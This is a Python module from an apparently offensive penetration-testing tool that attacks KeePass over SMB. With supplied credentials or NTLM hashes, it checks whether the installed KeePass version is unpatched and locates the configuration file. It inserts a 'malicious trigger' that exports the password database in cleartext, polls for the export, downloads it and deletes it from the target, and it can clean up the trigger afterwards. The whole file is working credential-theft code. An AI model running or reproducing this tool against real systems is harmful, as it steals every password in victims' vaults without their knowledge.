import ntpath
import os
from io import BytesIO
from pathlib import Path
from time import sleep

import chardet
import pefile
from lxml import etree
from impacket.smbconnection import SessionError
from termcolor import cprint, colored

from keepwn.utils.logging import print_error, print_info, print_success, Loader, format_path, print_warning, \
    display_smb_error, print_error_target
from keepwn.utils.parser import parse_mandatory_options, parse_remote_path
from keepwn.utils.smb import smb_connect
from packaging.version import Version

def is_keepass_patched(smb_connection, share):
    try:
        path = '\\Program Files\\KeePass Password Safe 2\\KeePass.exe'
        for file in smb_connection.listPath(share, path):
            # get keepass version (we download KeePass.exe and parse the binary content)
            buffer = BytesIO()
            smb_connection.getFile(share, path, buffer.write)
            pe = pefile.PE(data=buffer.getvalue())
            enum_dict = pe.dump_dict()
            version = enum_dict['Version Information'][0][2][11][b'ProductVersion'].decode("utf-8")
            version = '.'.join(version.split('.')[0:3])

            if Version(version) >= Version('2.53.1'):
                return True, version
            else:
                return False, version
    except SessionError as e:
        pass

    return None, None


def get_config_file_path(smb_connection, share, config_path_parameter):

    # we first check if the user-specified configuration path is found on the target
    if config_path_parameter:
        try:
            for file in smb_connection.listPath(share, config_path_parameter):
                print_info("Found the specified KeePass configuration {}".format(format_path('\\\\{}{}'.format(share, config_path_parameter))))
                return config_path_parameter
        except SessionError as e:
            print_error("The specified configuration file was not found, exiting")
            return None
    else:
        print_info("No KeePass configuration path specified, searching in default locations..")

        # search for the enforced configuration file
        try:
            path = '\\Program Files\\KeePass Password Safe 2\\KeePass.config.enforced.xml'
            for file in smb_connection.listPath(share, path):
                print_info("Found enforced KeePass configuration {}".format(format_path('\\\\{}{}'.format(share, path))))
                return path
        except SessionError as e:
            pass  # the file was not found, we immediatly search for the global one

        # search for a global configuration file
        try:
            path = '\\Program Files\\KeePass Password Safe 2\\KeePass.config.xml'
            for file in smb_connection.listPath(share, path):
                print_info("Found global KeePass configuration {}".format(format_path('\\\\{}{}'.format(share, path))))
                global_config_file_content = read_config_file(smb_connection, share, path)
                tree = etree.fromstring(global_config_file_content.encode())
                found_trigger = False
                for configuration in tree.findall('./Meta/PreferUserConfiguration'):
                    # check that the local configuration file is in use (most cases)
                    # TODO: handle merge cases (see: https://keepass.info/help/kb/config_enf.html)
                    if configuration.text == 'false':
                        print_info("PreferUserConfiguration flag is set to " +colored('false', attrs=['bold'])+ ", using the global configuration'")
                        return path
                    elif configuration.text == 'true':
                        print_info("PreferUserConfiguration flag is set to " +colored('true', attrs=['bold'])+ ", meaning that local configuration is used")
        except SessionError as e:
            pass  # the file was not found

        # search for local configuration files
        local_config_paths = []
        try:
            for file in smb_connection.listPath(share, '\\Users\\*'):
                if file.is_directory():
                    try:
                        path = '\\Users\\{}\\AppData\\Roaming\\KeePass\\KeePass.config.xml'.format(file.get_longname())
                        for file in smb_connection.listPath(share, path):
                            local_config_paths.append(path)
                    except SessionError as e:
                        pass  # the file was not found
        except Exception as e:
            pass  # the file was not found

        if len(local_config_paths) == 1:
            print_info("Found local KeePass configuration {}".format(format_path('\\\\{}{}').format(share, local_config_paths[0])))
            return local_config_paths[0]
        elif len(local_config_paths) == 0:
            print_error("No local KeePass configurations found, you can specify a pass with --config if it is somewhere else")
            exit(1)
        elif len(local_config_paths) >= 1:
            print_error("Multiple local KeePass configurations found, please use --config to specify one amongst the following:")
            for local_config_path in local_config_paths:
                cprint("    '{}'".format(local_config_path), 'blue')
            exit(0)


def read_config_file(smb_connection, share, config_file_path):
    fh = BytesIO()
    try:
        smb_connection.getFile(share, config_file_path, fh.write)
    except:
        raise
    output = fh.getvalue()
    encoding = chardet.detect(output)['encoding']
    error_msg = "KeePass.config.xml cannot be correctly decoded, are you sure that the text is readable?"
    config_file_content = ""
    if encoding:
        try:
            config_file_content = output.decode(encoding)
        except:
            print_error_target(error_msg)
        finally:
            fh.close()
    else:
        print_error_target(error_msg)

    return config_file_content


def get_triggers_names(smb_connection, share, config_file_path):
    config_file_content = read_config_file(smb_connection, share, config_file_path)
    tree = etree.fromstring(config_file_content.encode())
    triggers = []
    for trigger in tree.findall('./Application/TriggerSystem/Triggers/Trigger'):
        triggers.append(list(trigger.iter('Name'))[0].text)
    return triggers


def check_trigger(options):
    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)

    if error or not smb_connection:
        display_smb_error(error, target, False)
        return

    if options.config_path:
        custom_config_path = parse_remote_path(options.config_path)
    else:
        custom_config_path = None
    config_file_path = get_config_file_path(smb_connection, share, custom_config_path)

    if not config_file_path:
        return

    triggers = get_triggers_names(smb_connection, share, config_file_path)

    if triggers:
        for trigger in triggers:
            print_success("Found trigger '{}'".format(trigger))
    else:
        print_success("No trigger found in KeePass configuration")


def add_trigger(options):
    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)

    if error or not smb_connection:
        display_smb_error(error, target, False)
        return

    # we first look for keepass version, to prevent the user from screwing its penetration test engagement :D
    patched, version = is_keepass_patched(smb_connection, share)
    if patched == None:
        print_warning("Unable to determine KeePass version. Trigger extraction may not work, do you want to keep going? [y/n]".format(version))
        ans = input('> ')
        if ans.lower() not in ['y', 'yes', '']:
            print_success("Safety first, good choice :)")
            exit(0)
    elif patched == True:
        print_error("Detected KeePass {} > 2.53, you should abuse plugins instead of triggers for passwords extraction, as various safety features were added.".format(version))
        print("    See https://github.com/d3lb3/KeeFarceReborn for more information on plugin abuse :)")
        exit(1)

    if options.config_path:
        custom_config_path = parse_remote_path(options.config_path)
    else:
        custom_config_path = None
    config_file_path = get_config_file_path(smb_connection, share, custom_config_path)

    if not config_file_path:
        return

    if 'export' in get_triggers_names(smb_connection, share, config_file_path):
        print_info("Malicious trigger 'export' already added to the specified configuration file.")
        return

    # get config XML from remote file
    config_file_content = read_config_file(smb_connection, share, config_file_path)
    parser = etree.XMLParser(remove_blank_text=True)
    config_root = etree.fromstring(config_file_content.encode(), parser)
    # get malicious trigger XML from local file
    if options.trigger_path:
        if not os.path.exists(options.trigger_path):
            print_error('The specified XML trigger file does not exist')
            exit(1)
        trigger_local_path = options.trigger_path
    else:
        cwd = Path.cwd()
        mod_path = Path(__file__).parent
        trigger_local_path = (mod_path / '../data/export_database_trigger.xml').resolve()

    try:
        trigger_root = etree.parse(trigger_local_path, parser).getroot()
        print("trigger root is {}".format(trigger_root))
    except:
        print_error("The specified trigger file does not look like a valid XML..")
        exit(1)

    if trigger_root.tag != "Trigger":
        print_error("The root tag is not Trigger {}".format(trigger_root.tag))
        exit(1)
    # insert trigger XML inside config XML
    elem = config_root.find('./Application/TriggerSystem/Triggers')
    elem.text = None
    elem.append(trigger_root)
    # reformat to match KeePass XML
    etree.indent(config_root, space="\t")
    config_string = etree.tostring(config_root, pretty_print=True).decode("utf-8")
    config_string = config_string.replace('/>', ' />')
    config_string = '<?xml version="1.0" encoding="utf-8"?>\n' + config_string
    config_string = '\n'.join([ll.rstrip() for ll in config_string.splitlines() if ll.strip()])
    # TODO: add diff between files to make sure we did not destroyed the original configuration file
    # writing to remote file
    fh = BytesIO(bytes(config_string,'ascii'))
    try:
        smb_connection.putFile(share, config_file_path, fh.read)
    except:
        raise

    if 'export' in get_triggers_names(smb_connection, share, config_file_path):
        print_success("Malicious trigger 'export' successfully added to KeePass configuration file (it may be deleted if KeePass is already running)")
    else:
        print_error("Unknown error while adding trigger 'export' to KeePass configuration file")


def clean_trigger(options):

    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)
    if error or not smb_connection:
        display_smb_error(error, target, False)
        return

    if options.config_path:
        custom_config_path = parse_remote_path(options.config_path)
    else:
        custom_config_path = None
    config_file_path = get_config_file_path(smb_connection, share, custom_config_path)

    if not config_file_path:
        return

    if 'export' not in get_triggers_names(smb_connection, share, config_file_path):
        print_info("No malicious trigger called 'export' in the configuration file.")
        return

    # get config XML from remote file
    config_file_content = read_config_file(smb_connection, share, config_file_path)
    parser = etree.XMLParser(remove_blank_text=True)
    config_root = etree.fromstring(config_file_content.encode(), parser)

    tree = etree.fromstring(config_file_content.encode())

    for trigger in config_root.findall('./Application/TriggerSystem/Triggers/Trigger'):
        if list(trigger.iter('Name'))[0].text == 'export':
            print_info("Found trigger 'export' to delete")
            trigger.getparent().remove(trigger)

    etree.indent(config_root, space="\t")
    config_string = etree.tostring(config_root, pretty_print=True).decode("utf-8")
    config_string = '<?xml version="1.0" encoding="utf-8"?>\n' + config_string # TODO: avoid hardcoded data
    config_string = '\n'.join([ll.rstrip() for ll in config_string.splitlines() if ll.strip()])
    # TODO: add diff between files to make sure we did not destroyed the original configuration file
    # writing to remote file
    fh = BytesIO(bytes(config_string,'ascii'))
    try:
        smb_connection.putFile(share, config_file_path, fh.read)
    except:
        raise

    if 'export' not in get_triggers_names(smb_connection, share, config_file_path):
        print_success("Malicious trigger successfully deleted from configuration file.")
    else:
        print_error("Unknwon error while removing trigger")
    # TODO: print warning message that the trigger may not be deleted if keepass is running (config file reloaded)


def poll_trigger(options):

    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)

    if error or not smb_connection:
        display_smb_error(error, target, False)
        return

    export_path = None

    if options.poll_path:
        poll_path = parse_remote_path(options.poll_path)
    else:
        poll_path = None

    if options.single:
        #TODO: refactor in function to avoid code duplication (single/multiple poll + trigger/plugin poll)
        try:
            if poll_path:
                try:
                    for file in smb_connection.listPath(share, poll_path):
                        if not file.is_directory():
                            export_path = poll_path
                            continue
                        else:
                            print_error("Found a directory, are you sure that you specified an export file path?")
                except SessionError as e:
                    pass
            else:
                for file in smb_connection.listPath(share, '\\Users\\*'):
                    if file.is_directory():
                        try:
                            path = '\\Users\\{}\\AppData\\Roaming\\export.xml'.format(file.get_longname())
                            for found_file in smb_connection.listPath(share, path):
                                export_path = path
                                continue
                        except SessionError as e:
                            pass  # the file was not found
        except SessionError as e:
            pass

        if not export_path:
            if poll_path:
                print_error("{} not found on tharget".format(format_path('\\\\' + share + poll_path)))
            else:
                print_error("%APPDATA%\export.xml not found on target".format(share))
            exit(0)

    else:
        try:
            with Loader("Polling for database export every 5 seconds.. press CTRL+C to abort", end="Polling for database export every 5 seconds.. press CTRL+C to abort. DONE"):
                while not export_path:
                    try:
                        if poll_path:
                            try:
                                for file in smb_connection.listPath(share, poll_path):
                                    if not file.is_directory():
                                        export_path = poll_path
                                        continue
                                    else:
                                        print()
                                        print_error("Found a directory, are you sure that you specified an export file path?")
                                        exit(1)
                            except SessionError as e:
                                pass  # the file was not found
                        else:
                            for file in smb_connection.listPath(share, '\\Users\\*'):
                                if file.is_directory():
                                    try:
                                        path = '\\Users\\{}\\AppData\\Roaming\\export.xml'.format(file.get_longname())
                                        for found_file in smb_connection.listPath(share, path):
                                            export_path = path
                                            continue
                                    except SessionError as e:
                                        pass  # the file was not found
                    except SessionError as e:
                        pass  # the file was not found
                    if not export_path:
                        sleep(5)
        except KeyboardInterrupt:
            exit(0)

    export_path_basename = ntpath.basename(export_path)
    print_success("Found cleartext export {}".format(format_path('\\\\{}\\{}'.format(share, export_path))))

    try:
        buffer = BytesIO()
        smb_connection.getFile(share, export_path, buffer.write)
        local_path = os.path.join(os.getcwd(), export_path_basename)
        # downloads the exported database
        with open(local_path, "wb") as f:
            f.write(buffer.getbuffer())

        smb_connection.deleteFile(share, export_path)
        relative_path = os.path.relpath(local_path, os.getcwd())
        print_success("Moved remote export to {}".format('.' + os.sep + relative_path))
    except:
        print_error("Unkown error while getting export.")
        exit(1)
